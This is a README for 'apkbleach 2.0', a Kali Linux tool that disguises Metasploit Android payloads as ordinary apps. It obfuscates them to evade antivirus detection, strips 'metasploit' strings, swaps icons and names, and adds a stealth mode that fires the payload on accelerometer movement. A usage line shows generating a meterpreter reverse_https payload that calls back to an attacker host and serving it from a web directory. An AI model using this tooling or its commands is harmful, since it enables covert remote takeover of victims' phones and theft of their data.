# apkbleach 2.0
![Screen shot of sofware image](https://github.com/graylagx2/Images/blob/master/apkbleach2.png)

**About:**

This software was developed specifically for Kali-Linux to obfuscate android payloads in attempts to evade detection. This software also automates the process of changing the app icon, changing the app name, signing the apk, aligning the apk and installing or upgrading apktool.

**Features:**

1) Line by line permissions editing. The software will go through each permission in the manifest and ask if you want to delete it.

2) Stealth option. This executes the payload off the devices accelerometer instead of on open. This option also allows you to choose how many sessions you want spawned of exploit.

3) Custom icon injection. This allows users to modify the app icon that appears on the home screen of a android device. You can choose from a icon apkbleach provides or you can supply your own. Apkbleach will do all the work for you.

4) Renames the application to the name you put chose as the ouput file

5) Scrubs the entire application of any mentions of the name "metasploit" or "stage". There are a lot by the way. sending security testing with an app that contains the name metasploit is just funny :-)

6) Adds padnops to PAYLOAD

7) Signs apk with jarsigner. msfenom produces unsigned apps

8) Zip aligns apk

9) Apktool upgrade feature. If the software detects youre using apktool version 2.4.1-dirty which is Kali's package maintainers version it will ask if you want to replace it with the lates version frfom ibot peaches. This is a good idea because it conflicts with the msfvenom -x option and throws a version number error. Not to mention the problems it has given users in the past.

**Usage:**

    apkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 3 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk

     apkbleach --list-payloads
 
     apkbleach --list-icons
 
     apkbleach --clear-cache
 

**optional arguments:**

      -h, --help            show this help message and exit
  
      -g [PAYLOAD] [LHOST] [LPORT]
                        Generates a payload
                        
      -s [number of sessions to spawn 1-5]
                        Executes payload on accelerometer activity instead of on open
                        
      -i [BLEACH_icon..] or [path/to/custom/icon]
                        Injects an icon
                        
      -o [output/path/for/apk]
                        Path to output apk
                        
      --edit-permissions    Enables permission editing in apk's manifest
  
      --list-payloads       List available icons
  
      --list-icons          List available icons
  
      --clear-cache         Allows prompt whether to keep package maintainers version apktool
  
**Install instructions:**

After cloning or downloading the repository cd into the apkbleach directory and run run install.sh

    cd apkbleach
    bash install.sh
    
or

    cd apkbleach
    chmod +x install.sh
    ./install.sh
